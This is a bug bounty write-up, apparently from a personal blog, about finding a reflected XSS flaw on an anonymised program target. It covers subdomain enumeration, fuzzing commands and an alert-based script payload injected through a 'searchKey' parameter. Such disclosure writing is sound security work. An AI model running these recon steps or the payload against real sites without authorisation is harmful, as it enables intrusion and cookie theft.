+++
date = '2025-03-24T02:40:02Z'
draft = false
title = 'Reflected XSS via Magic Words'
[cover]
image = "https://emtwo.info/images/2.jpg"
alt = ""
caption = ""
+++


### Overview
This report details the discovery and exploitation of a XSS vulnerability identified in the Vulnerability Disclosure Program (VDP) of a target website.

### Reconnaissance
The reconnaissance phase began with the enumeration of subdomains to identify fresh assets that might be unexplored by previous researchers. Initially, I utilized the tool `subfinder` with the following command:

```bash
subfinder -d target.com -all -silent | tee target.com.subs
```

Using the `-all` switch significantly enhanced the enumeration results. To ensure comprehensive coverage, DNS brute-forcing was also executed with `shuffleDNS` against a wordlist containing approximately 24 million entries:

```bash
shuffledns -d target.com -r resolver.txt -w words.txt -mode bruteforce -silent | anew target.com.subs
```

This approach resulted in approximately 400 unique subdomains. To verify which of these subdomains had active HTTP services, I employed `httpx`:

```bash
cat target.com.subs | httpx -silent -sc -title -fr | tee target.com.http
```

Ultimately, 23 subdomains were confirmed to have active HTTP services.

### In-depth Analysis and Fuzzing
One of these subdomains, `commercial.target.com`, was selected for deeper investigation. Historical URLs and parameters were identified using `waybackurl`:

```bash
echo commercial.target.com | waybackurl > commercial.target.com.wayback
```

The resulting data contained numerous URLs and JavaScript files. All unique words from these URLs were extracted with [`diverman`](https://github.com/amirmmafakheri/Diverman):
```bash
python diverman.py -f commercial.target.com.wayback | sort -u > uniquewords.txt
```
yielding approximately 14,000 unique, target-specific terms. These terms provided an ideal basis for subsequent fuzzing of the web application endpoints.

Fuzzing commenced using `ffuf` to identify hidden or undocumented paths:

```bash
ffuf -w uniquewords.txt -u https://commercial.target.com/FUZZ -c -mc all -fs 14
ffuf -w uniquewords.txt -u https://commercial.target.com/path/FUZZ -c -mc all -fs 14
ffuf -w uniquewords.txt -u https://commercial.target.com/path/path/FUZZ -c -mc all -fs 14
```

This process led to a specific endpoint:
```
https://commercial.target.com/path/path/path
```

Parameter fuzzing was then conducted with the tool `x8` to uncover potentially exploitable parameters:

```bash
x8 -u https://commercial.target.com/path/path/path -w uniqewords.txt -X GET POST
```

The fuzzing process identified three reflective parameters: `q`, `s`, and `searchKey`.

### Vulnerability Identification and Exploitation
Initial tests with the input value `amir123` confirmed reflection in all three parameters:

```
https://commercial.target.com/path/path/path?q=amir123&s=amir123&searchKey=amir123
```

Subsequently, input validation was tested using the payload `</test>` to assess HTML tag handling. The parameters `q` and `s` properly encoded HTML tags, whereas the `searchKey` parameter rendered the payload directly, revealing a reflected XSS vulnerability.

The final proof-of-concept payload executed successfully:

```html
"><script>alert(origin)</script>
```

URL:
```
https://commercial.target.com/path/path/path/?searchKey="><script>alert(origin)</script>
```

![Alt Text](/images/3.jpg)

### Impact
The discovered vulnerability enabled an attacker to execute arbitrary JavaScript in the victim’s browser, facilitating cookie theft and unauthorized access to user accounts.

Despite the severity rated as "low" by HackerOne triage, the prompt validation and effective reporting resulted in an invitation to a private bug bounty program within four hours of submission.

### Conclusion
This detailed report highlights the importance of thorough reconnaissance, precise fuzzing, and careful testing of web application parameters. Proper validation measures are critical to preventing vulnerabilities such as Cross-Site Scripting.

---

I hope this report has been useful to you.😎
